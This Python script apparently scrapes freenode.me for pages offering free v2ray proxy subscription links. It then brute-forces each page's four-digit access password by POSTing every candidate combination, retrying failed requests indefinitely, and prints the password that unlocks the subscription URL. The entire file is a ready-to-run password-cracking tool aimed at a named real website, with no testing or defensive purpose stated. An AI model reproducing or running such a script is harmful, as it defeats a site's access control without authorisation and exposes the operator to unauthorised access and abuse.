import re
import sys
import getopt
import traceback
import time

from pathlib import Path
from tqdm import tqdm
import requests
from bs4 import BeautifulSoup
from loguru import logger

from zwtk.fileutils import dirsize
from zwtk.comm import waitkey

EXE_PTH = Path(sys.argv[0]).resolve()
CWD_DIR = Path(sys.argv[0]).parent.resolve()
TMP_DIR = Path(__file__).parent.parent.resolve()
MEI_TMP = Path(sys._MEIPASS) if hasattr(sys, '_MEIPASS') else Path('.')
SRC_DIR = CWD_DIR
OUT_DIR = CWD_DIR
NUM_TYP = 0 # 0: password is four digital and none of them is equal(permutation without repetition), 1: all probability of four digital (full permutation)
RETRY_SLEEP = 60
URL = 'https://freenode.me/'

def usage():
    print(
'Usage: {0} [-h|--help] [-p|--permut] [-u|--url]\n\
Description: Search url "{1}" for v2ray subscription link. Use permutation without repetition (default) or full permutation (-p) of four digital to crack access password\
'.format(EXE_PTH.name, URL)
    )

def get_subs_url(url):
    subs_url = None
    reqs_url = None
    reqs_pwd = None
    if url is None:
        resp = requests.get(URL)
        soup = BeautifulSoup(resp.text, features='html.parser')
        arr = soup.find_all('a', string=re.compile(r'免费.*节点.*订阅|分享'), href=re.compile(r'https://freenode.me/a/.*'))
    else:
        arr = [url]

    pwds = []
    for i in range(1,10):
        for j in range(1,10):
            for k in range(1,10):
                for h in range(1,10):
                    if NUM_TYP == 0:
                        if len({i,j,k,h}) == 4:
                            pwds.append('%s%s%s%s'%(i,j,k,h))
                    else:
                        pwds.append('%s%s%s%s'%(i,j,k,h))

    print('Start...')
    for o in arr:
        url = o.attrs['href'] if hasattr(o, 'href') else o
        print('Try url: %s' % url)
        with tqdm(pwds, desc='Processing', leave=True, unit='item') as pbar:
            for idx,pwd in enumerate(pwds):
                headers = {
                    'Content-Type': 'application/x-www-form-urlencoded',
                }
                data = {
                    'pwd': pwd,
                }
                p = None
                ishttpsucc = True
                while ishttpsucc:
                    try:
                        r = requests.post(url, headers=headers, data=data)
                        ishttpsucc = False
                    except:
                        time.sleep(RETRY_SLEEP)
                htmlstr = r.text
                s = BeautifulSoup(htmlstr, features='html.parser')
                p = s.find('p', string=re.compile(r'https://freenode.me/wp-content/uploads/.*.txt'))
                if p:
                    subs_url = p.text
                    reqs_url = url
                    reqs_pwd = pwd
                    pbar.update(len(pwds)-idx)
                    break
                else:
                    pbar.update(1)
        if subs_url:
            break
    if subs_url:
        print('[FOUND] subs url: %s, page url: %s, page pwd: %s' % (subs_url, reqs_url, reqs_pwd))
    print('Finish...')
    return subs_url

def main():
    try:
        try:
            opts, args = getopt.getopt(sys.argv[1:], 'hpu:', ['help', 'permut', 'url'])
        except getopt.GetoptError as err:
            # print help information and exit:
            print(err)  # will print something like "option -a not recognized"
            usage()
            sys.exit(2)

        url = None
        for o, a in opts:
            if o in ('-h', '--help'):
                usage()
                sys.exit()
            elif o in ('-u', '--url'):
                url = a
            elif o in ('-p', '--permut'):
                global NUM_TYP
                NUM_TYP = 1
            else:
                assert False, 'unhandled option'
        print('Exe path: %s, Unpack size: %.2fM'%( MEI_TMP, (dirsize(MEI_TMP)/1024/1024) ))
        usage()
        get_subs_url(url)
    except Exception:
        traceback.print_exc()

    print('Press any key to continue...')
    waitkey()

if __name__ == '__main__':
    main()
